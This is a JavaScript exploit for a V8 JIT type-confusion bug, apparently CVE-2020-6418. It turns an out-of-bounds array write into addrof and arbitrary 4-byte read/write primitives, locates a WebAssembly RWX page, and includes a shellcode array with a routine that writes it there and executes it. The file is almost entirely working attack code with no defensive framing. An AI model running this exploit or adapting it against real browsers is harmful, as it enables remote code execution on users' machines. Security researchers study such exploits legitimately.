function exp_6418_80_arm() {

    // for rwx
    let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
    let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
    let wasm_func = wasm_mod.exports._Z3addii;

    function hex(a) {
        return "0x" + a.toString(16);
    }


    //let vuln = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];   // original
    let vuln = [0.1, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];
    var bug_target_arr = null;      // float array, initially corruption target
    let oob_rw_target_arr = null; 
    let arb_4rw_arr = null;
    let arb_4rw_arr_idx = null;
    let arb_4rw_arr_ext_ptr_idx = null;
    let arb_4rw_arr_base_ptr_idx = null;
    let arb_4rw_arr_ext_ptr_original = 0x0;
    let arb_4rw_arr_base_ptr_original = 0x0;
    let addrof_arr = null;
    let addrof_leak_idx = null;

    vuln.pop();
    vuln.pop();
    vuln.pop();

    function empty() {}

    function f(nt) {
        // The compare operation enforces an effect edge between JSCreate and Array.push, thus introducing the bug
        //vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 156842065920.05); // 0x00000666 0x42424242
        //vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 1.0);   // 0x00000000 0x3ff00000
        //vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 8.691694759794e-311); // 0x00000000 0x00001000, for 80 x64
        vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 8.6916947597997e-311); // 0x0000000c 0x00001000, for 80 x86
           
        
        
        for (var i = 0; i < 0x10000; ++i) {};
    }

    let p = new Proxy(Object, {
        get: function() {
            vuln[0] = {};
            bug_target_arr = [0.2, 1.2, 2.2, 3.2, 4.3];
            //float_carw = [6.6];
            oob_rw_target_arr = new Uint32Array(3);
            arb_4rw_arr = new Uint32Array(2);
            addrof_arr = [0x41dada, 0x43adad, {}];
            /*
            console.log("\n<< bug_target_arr >>");
            %DebugPrint(bug_target_arr);
            console.log("\n<< oob_rw_target_arr >>");
            %DebugPrint(oob_rw_target_arr);
            console.log("\n<< arb_4rw_arr >>");
            %DebugPrint(arb_4rw_arr);
            console.log("\n<< addrof_arr >>");
            %DebugPrint(addrof_arr);
            */
            return Object.prototype;
        }
    });

    function main(o) {
      for (var i = 0; i < 0x10000; ++i) {};
      return f(o);
    }


    //////////////////////////////////////////////////////////////////////////////

    function addrof(obj) {
      if (addrof_leak_idx == null)
        return undefined;
      addrof_arr[0] = obj;
      return oob_rw_target_arr[addrof_leak_idx];
    }

    function read4(addr) {
        if (arb_4rw_arr_ext_ptr_idx == null)
            return false;
        if (arb_4rw_arr_base_ptr_idx == null)
            return false;
        /*
        console.log(typeof addr);
        console.log(typeof arb_4rw_arr_ext_ptr_original[0]);
        */
        oob_rw_target_arr[arb_4rw_arr_ext_ptr_idx] = addr;
        oob_rw_target_arr[arb_4rw_arr_base_ptr_idx] = 0x0;
        var ret = arb_4rw_arr[0];
        oob_rw_target_arr[arb_4rw_arr_ext_ptr_idx] = arb_4rw_arr_ext_ptr_original[0];
        oob_rw_target_arr[arb_4rw_arr_base_ptr_idx] = arb_4rw_arr_base_ptr_original[0];
        return ret;
    }

    function write4(addr, value) {
        if (arb_4rw_arr_ext_ptr_idx == null)
            return false;
        if (arb_4rw_arr_base_ptr_idx == null)
            return false;
        oob_rw_target_arr[arb_4rw_arr_ext_ptr_idx] = addr;
        oob_rw_target_arr[arb_4rw_arr_base_ptr_idx] = 0x0;
        arb_4rw_arr[0] = value;
        oob_rw_target_arr[arb_4rw_arr_ext_ptr_idx] = arb_4rw_arr_ext_ptr_original[0];
        oob_rw_target_arr[arb_4rw_arr_base_ptr_idx] = arb_4rw_arr_base_ptr_original[0];
    }


    function get_rwx() {
        var wasm_mod_addr = addrof(wasm_mod);
        console.log("wasm_mod addr: " + hex(wasm_mod_addr));
        //%DebugPrint(wasm_mod);

        //kJumpTableStartOffset = 0x68;   // for 8.0 x64
        kJumpTableStartOffset = 0x40;   // for 8.0 x86
        var rwx_addr = read4(wasm_mod_addr + kJumpTableStartOffset - 1);
        /*
        console.log("rwx_addr: " + hex(rwx_addr));

        var first_4bytes = read4(rwx_addr);
        var first_8bytes = read8(rwx_addr);
        console.log("first_4bytes: " + hex(first_4bytes));
        console.log("first_8bytes: " + hex(first_8bytes));
        */

        return rwx_addr;
    }


    function run_shellcode(rwx_addr) {
        var shellcode = [
            //0xcc909090,
            0x4850c031,
            0xeb24148b,
            0x06785410,
            0x3bb05f5e,
            0x5b59050f,
            0xcd0bb040,
            0xffebe880,
            0x622fffff,
            0x732f6e69,
            0x00000068
        ];

        addr = rwx_addr;
        for(let i = 0; i < shellcode.length; i++) {
            write4(addr, shellcode[i]);
            addr += 0x4;
        }
        wasm_func();
    }


    function get_compressed_rw() {

        for (var i = 0; i < 0x10000; ++i) {empty();}

        main(empty);
        main(empty);

        // Function would be jit compiled now.
        main(p);

        if (oob_rw_target_arr.length != 0x1000)
            return false;

        return true;
    }

    function get_arw() {
        if (!get_compressed_rw()) {
            console.log("exploit failed");
            return false;
        }       

        console.log("after triggering!");
        console.log("oob_rw_target_arr.length: " + oob_rw_target_arr.length);

        // make addrof
        addrof_arr[0] = 0x42ebeb;
        addrof_arr[1] = 0x45c8c8;
        for (var i = 0; i < 0x1000; i++) {
          if(oob_rw_target_arr[i] == 0x42ebeb*2) {
            if(oob_rw_target_arr[i+1] == 0x45c8c8*2) {
              addrof_leak_idx = i; 
              break;
            }
          }
        }
        console.log("addrof_leak_idx = " + addrof_leak_idx);
        if (addrof_leak_idx == null)
            return false;

        /*
        oob_rw_target_arr = new Uint32Array(2);
        arb_4rw_arr = new Uint32Array(2);
        addrof_arr = [0x41dada, 0x43adad, {}];
        */

        addrof_arr_addr = addrof(addrof_arr);
        arb_4rw_arr_addr = addrof(arb_4rw_arr);

        console.log("arb_4rw_arr addr: " + hex(arb_4rw_arr_addr));
        console.log("addrof_arr addr: " + hex(addrof_arr_addr));

        //addrof_arr_addr_idx_offset_from_element0 = 0x28 / 0x4;     // 0x28: for x64, 8.0
        addrof_arr_addr_idx_offset_from_element0 = 0x28 / 0x4;     // 0x28: for x86, 8.0
        addrof_arr_addr_idx = addrof_leak_idx + addrof_arr_addr_idx_offset_from_element0;

        console.log("addrof_arr_addr_idx: " + addrof_arr_addr_idx);
        console.log("value: " + hex(oob_rw_target_arr[addrof_arr_addr_idx]));

        arb_4rw_arr_idx = addrof_arr_addr_idx - (addrof_arr_addr - arb_4rw_arr_addr) / 0x4;

        console.log("arb_4rw_arr_idx: " + arb_4rw_arr_idx);
        console.log("value: " + hex(oob_rw_target_arr[arb_4rw_arr_idx]));

        //ext_ptr_idx_offset = 0x28 / 0x4;  // 0x28: for x64, 8.0
        ext_ptr_idx_offset = 0x1c / 0x4;  // 0x1c: for x86, 8.0
        arb_4rw_arr_ext_ptr_idx = arb_4rw_arr_idx + ext_ptr_idx_offset;
        arb_4rw_arr_ext_ptr_original = oob_rw_target_arr[arb_4rw_arr_ext_ptr_idx];
        arb_4rw_arr_base_ptr_idx = arb_4rw_arr_ext_ptr_idx + 1;
        arb_4rw_arr_base_ptr_original = oob_rw_target_arr[arb_4rw_arr_base_ptr_idx];

        console.log("arb_4rw_arr_ext_ptr_idx: " + arb_4rw_arr_ext_ptr_idx);
        console.log("arb_4rw_arr_base_ptr_idx: " + arb_4rw_arr_base_ptr_idx);
        console.log("arb_4rw_arr ext_ptr: " + hex(arb_4rw_arr_ext_ptr_original) );
        console.log("arb_4rw_arr base_ptr: " + hex(arb_4rw_arr_base_ptr_original) );

        /*
        arb_4rw_arr_len_addr = arb_4rw_arr_addr + 0x20 - 1; // 0x20: for x64, 8.0
        arb_4rw_arr_len = cread4(arb_4rw_arr_len_addr);
        console.log("arb_4rw_arr_len: " + arb_4rw_arr_len);
        console.log(arb_4rw_arr.length);
        console.log(arb_4rw_arr[3]);
        cwrite4(arb_4rw_arr_len_addr, 0x10);
        console.log(arb_4rw_arr.length);
        console.log(arb_4rw_arr[3]);
        */

        return true;

    }


    function exp() {
        if (!get_arw()) {
            console.log("get_arw() failed.");
            return false;
        }

        return true;
    }

    function myclean() {
        // do nothing?
    }

    if (exp()) {
        this.success = true;
        this.cleanup = myclean;
        this.addrof = addrof;
        this.read4 = read4;  
        this.write4 = write4; 
        this.setUint32 = write4;
        this.get_rwx = get_rwx;
        this.tohex = hex;
        //this.rsh = run_shellcode
    } else {
        this.success = false;
    }

    return this;

}


/*
oob = new exp_6418_80_x86();
var rwx = oob.get_rwx();
console.log("## rwx addr: " + oob.tohex(rwx));
var first_4bytes = oob.read4(rwx);
console.log("first_4bytes: " + oob.tohex(first_4bytes));
oob.rsh(rwx);
*/